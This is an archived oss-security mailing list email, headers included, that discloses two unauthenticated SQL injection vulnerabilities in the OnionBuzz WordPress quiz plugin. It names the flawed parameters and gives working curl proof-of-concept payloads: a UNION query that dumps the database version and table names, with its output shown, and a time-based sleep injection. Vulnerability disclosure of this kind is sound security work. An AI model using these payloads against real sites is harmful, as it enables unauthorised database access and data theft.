X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1971" "Saturday" "20" "July" "2019" "18:35:49" "-0400" "Eugene Kolo" "eugene@eugenekolo.com" "<CAN1YN0tHY1PbJ=WeUDs=ToCZ-_JetOhAnJwou3PCdcfsoFy9Cg@mail.gmail.com>" "63" "[oss-security] Two unauthenticated SQL injection vulnerabilities in Onionbuzz WordPress plugin" nil nil nil "7" "2019072022:35:49" "[oss-security] Two unauthenticated SQL injection vulnerabilities in Onionbuzz WordPress plugin" (number mark "U       eugene@eugen Jul 20   63/1971  " thread-indent "\"[oss-security] Two unauthenticated SQL injection vulnerabilities in Onionbuzz WordPress plugin\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Two unauthenticated SQL injection vulnerabilities in Onionbuzz WordPress plugin" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 13429 invoked by uid 550); 21 Jul 2019 10:59:56 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9992 invoked from network); 20 Jul 2019 22:36:12 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=eugenekolo.com; s=google;
        h=mime-version:from:date:message-id:subject:to;
        bh=pRvRcxFa1D/xwqqZz9N/rMq6NIBgHGJoR5wvkDCYNOc=;
        b=WggLqBJUdaDcmPKjCZn1l+BvFmwPbvB2wjubMsUe2Bzn7rKIc/vr0SA8FwSNkR8UjM
         NsSnetutMw7K44LQnvr1qK/lcfS8e1OJL1DdDH0+LbVbNf+rfsTyoK6Dw2UA9XCDRjhm
         jaJb/M844KmyjrZMHWX/KEHZaiPu5fo3A0f2s=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=pRvRcxFa1D/xwqqZz9N/rMq6NIBgHGJoR5wvkDCYNOc=;
        b=q2JW5jaKd5EdwfQyJvl9gA28uq3KLA8ZRGK6+0Fm+2on44bDq4e33Z2BdNt+IMVI1E
         G4m+BE+ZbnkrxgcLITWgCTgOtoklbUiFQMMqvb7qNO1mikqEi62m3SmfN3CJXGpGbGor
         PwDzoVKas7lzD+bzpeTNwuvykpDKW+luQq0GlWpH3QZCZblrEZtpz8T6c+8VA/69Bj9A
         Cuv5Dvxie4PAUkTnl+7CBOCFF4GVI4UJ2YWd4xgitLF41+ZLEcpR8IsxknlAiZ6gfYhI
         k/lQqWnBIAdhaIKryUi4CaYjUS9uNlJnTuIHBng+9zL8pLe64Axfp7v3L3tGddGVQpyB
         zdEw==
X-Gm-Message-State: APjAAAVqSorbIH8R8zFlz8qn7FWxqw+v9xwq5cgobAoMd0lXGw7Ecjqs
	Q4BVWsl6JIKEjFhv6OTMNVftCxpR7vJfSaVVePgbAi3Mxw0=
X-Google-Smtp-Source: APXvYqw0L4y8Glac/klshxoG65hmEEbyCyJvWpz4StGAYUXH9Km+MhQb/5Nx1jHjbs6JBsbdd0WLH5OG97VT2E14q3U=
X-Received: by 2002:a65:514c:: with SMTP id g12mr62577829pgq.76.1563662160071;
 Sat, 20 Jul 2019 15:36:00 -0700 (PDT)
MIME-Version: 1.0
From: Eugene Kolo <eugene@eugenekolo.com>
Date: Sat, 20 Jul 2019 18:35:49 -0400
Message-ID: <CAN1YN0tHY1PbJ=WeUDs=ToCZ-_JetOhAnJwou3PCdcfsoFy9Cg@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="00000000000099a030058e24777e"
Subject: [oss-security] Two unauthenticated SQL injection vulnerabilities in Onionbuzz
 WordPress plugin

--00000000000099a030058e24777e
Content-Type: text/plain; charset="UTF-8"

Two unauthenticated/unprivileged SQL injection vulnerabilities in the Viral
Quiz Maker - Onionbuzz WordPress plugin.

Information
===========
Affected Product: Viral Quiz Maker - OnionBuzz WordPress plugin
Vendor Homepage: Onionbuzz.com
Vulnerability Type: SQL Injection
Discoverer: Eugene Kolodenker
Date: July-20-2019

1)

Description
===========
Prior to v1.2.2, you could exploit the `points` parameter in the
`ob_get_results` ajax nopriv handler due to there being no sanitization on
the points argument. The points parameter is not sanitized prior to be used
in a SQL query in getResultByPointsTrivia. This allows an
unauthenticated/unprivileged user to perform a SQL injection attack capable
of remote code execution and information disclosure.

Proof of Concept (POC)
======================
```
curl http://site/wp-admin/admin-ajax.php?action=ob_get_results --data
"type=get_result&id=1&quiz_type=5&points=1 or 1=0 union all select
1,1,version(),table_name,1,1,1,1,1 from information_schema.tables;#"
```

And get back:
```
{"quiz_id":1,"points":"1 or 1=0 union all select
1,1,version(),table_name,1,1,1,1,1 from
information_schema.tables;#","title":<DBVERSION>","description":"CHARACTER_SETS","featured_image":"<img
src=\"1\">","image_caption":"1","is_image":1,"success":1}
```


2)

Description
===========
Prior to v1.2.7, you could exploit the `id` parameter in the `set_count`
ajax nopriv handler due to there being no sanitization on the id argument.
The id parameter is not sanitized prior to be used in a SQL query in
saveQuestionVote. This allows an unauthenticated/unprivileged user to
perform a SQL injection attack capable of remote code execution and
information disclosure.


Proof of Concept (POC)
======================

```
curl http://site/wp-admin/admin-ajax.php?type=set_count --data
"action=ob_question_votes&id=1 or sleep(10);#"
```

--00000000000099a030058e24777e--
